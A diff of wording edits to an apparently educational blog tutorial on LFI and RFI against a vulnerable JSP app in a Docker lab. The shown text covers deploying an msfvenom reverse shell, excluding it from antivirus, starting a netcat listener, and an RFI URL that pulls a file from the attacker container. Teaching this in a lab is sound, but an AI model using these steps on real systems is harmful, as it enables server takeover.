@@ -2309,14 +2309,14 @@ if(name != null &#x26;&#x26; name.length() &#x3E; 0) {
 
 <p>We will now create a JSP reverse shell code.</p>
 
-<p>For a reverse shell you have to set the IP of to which the code has to connect if it is called. This can be the IP of the JSP attacker, which you can see from the docker logs:</p>
+<p>For a reverse shell you have to set the IP to which the code has to connect if it is called. This can be the IP of the JSP attacker server, which you can see from the docker logs:</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/jsp_ip_attackerserver.png" alt="JSP Final Remote Code Execution" width="100%" /></p>
 
 <p>The following code is generated with <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a>.</p>
 
 <p>Be aware, it can be detected and classified by Anti Virus Systems as malware.
-So you if this is the case and you have the possibility set an exception for</p>
+So if this is the case for you and you have the possibility set an exception for</p>
 <ul>
   <li>the path where you save the code and</li>
   <li>for the <code class="highlighter-rouge">victim_lfi_server_jsp/webapp</code> directory, where the code will be uploaded onto the victim server.</li>
@@ -2386,11 +2386,11 @@ if (System.getProperty(&#x22;os.name&#x22;).toLowerCase().indexOf(&#x22;windows&
 
 <p>If you upload the code as <code class="highlighter-rouge">reverseshell.jsp</code>,</p>
 <ul>
-  <li>go into the jsp attacker server using its docker id which you get with <code class="highlighter-rouge">docker ps -a</code> and do a <code class="highlighter-rouge">docker exec -ti &lt;container_id&gt; /bin/bash</code></li>
+  <li>go into the jsp attacker server (using its docker id which you get with <code class="highlighter-rouge">docker ps -a</code> and do a <code class="highlighter-rouge">docker exec -ti &lt;container_id&gt; /bin/bash</code>)</li>
   <li>set up a netcat listener on port 4444: <code class="highlighter-rouge">nc -nlvp 4444</code></li>
 </ul>
 
-<p>You can connect to the victim machine calling</p>
+<p>You can now connect to the victim server calling in the browser</p>
 
 <p><a href="http://127.0.0.1:8881/webapp/?help=reverseshell.jsp">http://127.0.0.1:8881/webapp/?help=reverseshell.jsp</a></p>
 
@@ -2398,9 +2398,9 @@ if (System.getProperty(&#x22;os.name&#x22;).toLowerCase().indexOf(&#x22;windows&
 
 <h3 id="rfi-2">RFI</h3>
 
-<p>Remote File Inclusion is also possible with this JSP Code.</p>
+<p>The JSP application is also vulnerable to Remote File Inclusion.</p>
 
-<p>Go into the attacker jsp server webapp folder and create a file called <code class="highlighter-rouge">thiscomesfromhaxxor</code>:</p>
+<p>Go into the attacker server webapp folder and create a file called <code class="highlighter-rouge">thiscomesfromhaxxor</code>:</p>
 
 <pre><code class="bash">cd attacker_server_jsp/webapp/
 </code></pre>
@@ -2408,7 +2408,7 @@ if (System.getProperty(&#x22;os.name&#x22;).toLowerCase().indexOf(&#x22;windows&
 <pre><code class="bash">echo &#x22;Unfortunately, RFI on your server is possible&#x22; &#x3E; thiscomesfromhaxxor
 </code></pre>
 
-<p>Now call:</p>
+<p>Now call in the browser:</p>
 
 <p><a href="http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor">http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor</a></p>
 
